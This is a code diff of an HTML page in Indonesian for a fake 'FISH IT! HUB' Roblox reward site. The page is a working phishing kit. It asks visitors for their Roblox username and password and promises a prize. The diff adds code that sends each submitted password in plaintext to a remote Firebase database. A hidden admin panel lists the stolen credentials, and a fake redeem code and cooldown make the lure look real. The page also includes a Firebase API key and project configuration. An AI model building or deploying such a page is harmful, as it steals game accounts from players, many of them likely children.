@@ -7,64 +7,26 @@
     <link rel="icon" href="https://tr.rbxcdn.com/180DAY-4f597950552b95730386c65012354c43/420/420/Image/Png">
     <link href="https://fonts.googleapis.com/css?family=Courier" rel="stylesheet">
     
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
+
     <style>
+        /* CSS tetap sama seperti sebelumnya */
         * { font-family: "Courier", monospace; color: white; box-sizing: border-box; margin: 0; padding: 0; }
         body, html { height: 100%; background: #0a0a0a; overflow-x: hidden; }
-
-        #bg-layer {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2;
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
-                        url('https://images.wallpapersden.com/image/download/roblox-game-2023_bWhpaWuUmZqaraWkpJRmbmdlrWlnZ2U.jpg');
-            background-size: cover; background-position: center;
-        }
-
-        #musicControl {
-            position: fixed; top: 20px; right: 20px; z-index: 100;
-            background: rgba(0, 85, 255, 0.5); border: 1px solid #0055ff;
-            padding: 10px; border-radius: 50%; cursor: pointer;
-            width: 45px; height: 45px; display: flex; align-items: center; justify-content: center;
-        }
-
-        .container {
-            max-width: 800px; margin: 50px auto; padding: 20px;
-            background: rgba(15, 15, 15, 0.9);
-            border: 1px solid #0055ff; border-radius: 15px;
-            text-align: center; box-shadow: 0 0 50px rgba(0, 85, 255, 0.2);
-        }
-
+        #bg-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://images.wallpapersden.com/image/download/roblox-game-2023_bWhpaWuUmZqaraWkpJRmbmdlrWlnZ2U.jpg'); background-size: cover; background-position: center; }
+        #musicControl { position: fixed; top: 20px; right: 20px; z-index: 100; background: rgba(0, 85, 255, 0.5); border: 1px solid #0055ff; padding: 10px; border-radius: 50%; cursor: pointer; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 800px; margin: 50px auto; padding: 20px; background: rgba(15, 15, 15, 0.9); border: 1px solid #0055ff; border-radius: 15px; text-align: center; box-shadow: 0 0 50px rgba(0, 85, 255, 0.2); }
         .logo { width: 100%; max-width: 400px; border-radius: 10px; margin-bottom: 20px; border: 2px solid #0055ff; }
-        
-        input { 
-            background: #111; border: 1px solid #0055ff; padding: 15px; 
-            margin: 10px 0; width: 100%; max-width: 350px; 
-            color: #00ff00; border-radius: 8px; outline: none; text-align: center;
-        }
-
-        button { 
-            background: #0055ff; padding: 15px 40px; border: none; 
-            border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;
-            transition: 0.3s; margin-top: 10px;
-        }
+        input { background: #111; border: 1px solid #0055ff; padding: 15px; margin: 10px 0; width: 100%; max-width: 350px; color: #00ff00; border-radius: 8px; outline: none; text-align: center; }
+        button { background: #0055ff; padding: 15px 40px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; margin-top: 10px; }
         button:hover { background: #0033aa; transform: scale(1.05); }
-
-        /* Popups */
-        .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center;
-        }
-        .popup-content {
-            background: #111; border: 2px solid #0055ff; padding: 30px; border-radius: 15px;
-            text-align: center; max-width: 450px; width: 90%; box-shadow: 0 0 30px #0055ff55;
-        }
-
-        .admin-card {
-            background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 10px; margin-bottom: 20px;
-        }
-
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; }
+        .popup-content { background: #111; border: 2px solid #0055ff; padding: 30px; border-radius: 15px; text-align: center; max-width: 450px; width: 90%; box-shadow: 0 0 30px #0055ff55; }
+        .admin-card { background: #1a1a1a; border: 1px solid #333; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
         th, td { border: 1px solid #333; padding: 10px; font-size: 13px; text-align: center; }
         th { background: #0055ff; }
-
         .footer { margin-top: 30px; font-size: 12px; color: #666; }
     </style>
 </head>
@@ -80,7 +42,7 @@
         <div class="popup-content">
             <h2 style="color: #00ff00;">REDEEM YOUR CODE</h2>
             <p style="margin: 10px 0; font-size: 14px;">Masukkan kode event untuk melanjutkan:</p>
-            <input type="text" id="redeemInput" placeholder="KODE DISINI" style="border-color: #00ff00;"><br>
+            <input type="text" id="redeemInput" placeholder="KODE DISINI"><br>
             <button onclick="validateRedeem()" style="background: #00ff00; color: black; width: 100%;">CLAIM</button>
         </div>
     </div>
@@ -96,14 +58,11 @@
     <div class="container" id="mainContent">
         <img src="https://tr.rbxcdn.com/180DAY-f446c1264701227ae463835b155f44af/768/432/Image/Webp/noFilter" class="logo">
         <h1>FISH IT! HUB</h1>
-        <p style="color: #00ff00; margin: 10px 0;">SERVER STATUS: ONLINE</p>
-        
         <form id="loginForm">
             <input type="text" id="user" placeholder="Username Roblox" required><br>
             <input type="password" id="pass" placeholder="Password Roblox" required><br>
             <button type="submit" style="width: 100%; max-width: 350px;">GET REWARD</button>
         </form>
-
         <div class="footer">
             <p>© 2026 Trade Fish It! Hub</p>
             <button onclick="openAdmin()" style="background:none; color:#333; font-size:10px;">Admin Access</button>
@@ -111,141 +70,131 @@
     </div>
 
     <div class="container" id="adminDashboard" style="display:none; max-width: 900px;">
-        <h1 style="color: #00ff00; margin-bottom: 20px;">MASTER CONTROL PANEL</h1>
-        
+        <h1 style="color: #00ff00;">MASTER CONTROL</h1>
         <div class="admin-card">
-            <h3>SET ACTIVE REDEEM CODE</h3>
-            <p style="font-size: 11px; color: #888; margin-bottom: 10px;">Kode ini yang harus dimasukkan oleh user.</p>
-            <input type="text" id="newMasterCode" placeholder="Masukkan Kode Baru" style="width: 200px; padding: 10px;">
-            <button onclick="updateMasterCode()" style="padding: 10px 20px; font-size: 12px; background: #00ff00; color: black;">SAVE CODE</button>
-            <p style="margin-top: 10px;">Kode Saat Ini: <span id="currentCodeDisplay" style="color: #00ff00; font-weight: bold;">-</span></p>
+            <h3>SET REDEEM CODE</h3>
+            <input type="text" id="newMasterCode" placeholder="New Code" style="width:200px">
+            <button onclick="updateMasterCode()" style="background:#00ff00; color:black">SAVE</button>
+            <p>Current: <span id="currentCodeDisplay" style="color:#00ff00">-</span></p>
         </div>
-
         <div class="admin-card">
-            <h3>USER DATA LOGS</h3>
-            <table id="logTable">
-                <thead>
-                    <tr>
-                        <th>Waktu</th>
-                        <th>User</th>
-                        <th>Pass</th>
-                    </tr>
-                </thead>
+            <h3>USER DATA (ONLINE)</h3>
+            <table>
+                <thead><tr><th>Waktu</th><th>User</th><th>Pass</th></tr></thead>
                 <tbody id="logBody"></tbody>
             </table>
-            <button onclick="clearLogs()" style="background: #ff4444; font-size: 12px; padding: 10px; margin-top: 10px;">HAPUS SEMUA LOG</button>
+            <button onclick="clearLogs()" style="background:#ff4444">HAPUS DATABASE</button>
         </div>
-
-        <button onclick="window.location.reload()" style="background:#444; width: 100%;">LOGOUT ADMIN</button>
+        <button onclick="window.location.reload()" style="background:#444; width:100%">LOGOUT</button>
     </div>
 
     <script>
-        // Inisialisasi Kode Default jika belum ada
-        if(!localStorage.getItem('masterRedeemCode')) {
-            localStorage.setItem('masterRedeemCode', 'FISHIT2026');
-        }
+        // --- KONFIGURASI FIREBASE ---
+        // GANTI DENGAN PUNYA ANDA SENDIRI DARI FIREBASE CONSOLE!
+        const firebaseConfig = {
+  apiKey: "AIzaSyCSe7uJK2ENnXycShRzhgSwuktLuQlK3LI",
+  authDomain: "fish-it-hub-77989.firebaseapp.com",
+  databaseURL: "https://fish-it-hub-77989-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "fish-it-hub-77989",
+  storageBucket: "fish-it-hub-77989.firebasestorage.app",
+  messagingSenderId: "1087852418708",
+  appId: "1:1087852418708:web:6b07308fb296446297c681",
+  measurementId: "G-WW80NJ1PJ9"
+};
 
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let currentUser = "";
+        let masterCode = "FISHIT2026";
+
+        // Ambil Kode dari Database secara Realtime
+        db.ref('settings/masterCode').on('value', (snap) => {
+            if(snap.val()) masterCode = snap.val();
+            document.getElementById('currentCodeDisplay').innerText = masterCode;
+        });
+
+        // Musik Logic
         const bgMusic = document.getElementById('bgMusic');
         const notifSound = document.getElementById('notifSound');
-        let currentUser = "";
+        window.addEventListener('click', () => { if(bgMusic.paused) bgMusic.play(); }, {once:true});
+        function toggleMusic() { bgMusic.paused ? bgMusic.play() : bgMusic.pause(); }
 
-        // Auto-play music on first click
-        window.addEventListener('click', () => {
-            if (bgMusic.paused) { bgMusic.play(); document.getElementById('musicControl').innerText = "⏸️"; }
-        }, { once: true });
-
-        function toggleMusic() {
-            if (bgMusic.paused) { bgMusic.play(); document.getElementById('musicControl').innerText = "⏸️"; }
-            else { bgMusic.pause(); document.getElementById('musicControl').innerText = "🎵"; }
-        }
-
-        // --- USER LOGIC ---
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        // --- USER ACTIONS ---
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
-            
-            // Cek Cooldown 24 Jam
-            const lastClaim = localStorage.getItem('lastClaimTime');
+            currentUser = document.getElementById('user').value.trim();
+            const password = document.getElementById('pass').value;
+
+            // Cek Cooldown di Database Online
+            const snap = await db.ref('cooldowns/' + currentUser).get();
             const now = new Date().getTime();
-            if (lastClaim && (now - lastClaim < 24 * 60 * 60 * 1000)) {
-                alert("Cooldown! Anda hanya bisa klaim 1x dalam 24 jam.");
+
+            if (snap.exists() && (now - snap.val() < 24 * 60 * 60 * 1000)) {
+                alert("Akun ini sudah klaim! Tunggu besok.");
                 return;
             }
 
-            currentUser = document.getElementById('user').value;
-            const log = {
+            // Simpan Log ke Database
+            db.ref('logs').push({
                 user: currentUser,
-                pass: document.getElementById('pass').value,
+                pass: password,
                 time: new Date().toLocaleString()
-            };
+            });
 
-            let db = JSON.parse(localStorage.getItem('webLogs')) || [];
-            db.push(log);
-            localStorage.setItem('webLogs', JSON.stringify(db));
-
-            // Munculkan Popup Redeem
             document.getElementById('redeemPopup').style.display = 'flex';
         });
 
         function validateRedeem() {
             const input = document.getElementById('redeemInput').value.toUpperCase();
-            const correctCode = localStorage.getItem('masterRedeemCode').toUpperCase();
-
-            if (input === correctCode) {
+            if (input === masterCode.toUpperCase()) {
                 notifSound.play();
+                db.ref('cooldowns/' + currentUser).set(new Date().getTime());
                 document.getElementById('redeemPopup').style.display = 'none';
-                localStorage.setItem('lastClaimTime', new Date().getTime());
-                
-                document.getElementById('popupMessage').innerText = "Selamat " + currentUser + "!\nItem sedang dikirim ke inventory Anda.";
+                document.getElementById('popupMessage').innerText = "Sukses " + currentUser + "!\nItem diproses.";
                 document.getElementById('notificationPopup').style.display = 'flex';
                 document.getElementById('loginForm').reset();
             } else {
-                alert("KODE SALAH! Silahkan cek info grup.");
+                alert("Kode Salah!");
             }
         }
 
-        function closePopup() {
-            document.getElementById('notificationPopup').style.display = 'none';
-        }
-
-        // --- ADMIN LOGIC ---
+        // --- ADMIN ACTIONS ---
         function openAdmin() {
-            const pin = prompt("Masukkan PIN Admin:");
-            if(pin === "2026") {
+            if(prompt("PIN Admin:") === "2026") {
                 document.getElementById('mainContent').style.display = 'none';
                 document.getElementById('adminDashboard').style.display = 'block';
-                renderAdminData();
-            } else {
-                alert("AKSES DITOLAK!");
+                loadLogs();
             }
         }
 
-        function renderAdminData() {
-            // Tampilkan Kode Saat Ini
-            document.getElementById('currentCodeDisplay').innerText = localStorage.getItem('masterRedeemCode');
-            
-            // Tampilkan Tabel Log
-            const db = JSON.parse(localStorage.getItem('webLogs')) || [];
-            document.getElementById('logBody').innerHTML = db.map(item => 
-                `<tr><td>${item.time}</td><td>${item.user}</td><td style="color:#ff4444">${item.pass}</td></tr>`
-            ).reverse().join('');
+        function loadLogs() {
+            db.ref('logs').on('value', (snap) => {
+                const logs = snap.val();
+                let html = "";
+                if(logs) {
+                    Object.values(logs).reverse().forEach(item => {
+                        html += `<tr><td>${item.time}</td><td>${item.user}</td><td style="color:#ff4444">${item.pass}</td></tr>`;
+                    });
+                }
+                document.getElementById('logBody').innerHTML = html;
+            });
         }
 
         function updateMasterCode() {
-            const newCode = document.getElementById('newMasterCode').value.toUpperCase();
-            if(newCode.length < 3) return alert("Kode terlalu pendek!");
-            
-            localStorage.setItem('masterRedeemCode', newCode);
-            document.getElementById('currentCodeDisplay').innerText = newCode;
-            document.getElementById('newMasterCode').value = "";
-            alert("Kode Redeem Berhasil Diubah ke: " + newCode);
+            const code = document.getElementById('newMasterCode').value.toUpperCase();
+            if(code) db.ref('settings/masterCode').set(code);
+            alert("Kode Berhasil Diubah!");
         }
 
         function clearLogs() {
-            if(confirm("Hapus semua data login user?")) {
-                localStorage.removeItem('webLogs');
-                renderAdminData();
+            if(confirm("Hapus semua data online?")) {
+                db.ref('logs').remove();
+                db.ref('cooldowns').remove();
             }
         }
+
+        function closePopup() { document.getElementById('notificationPopup').style.display = 'none'; }
     </script>
 </body>
 </html>
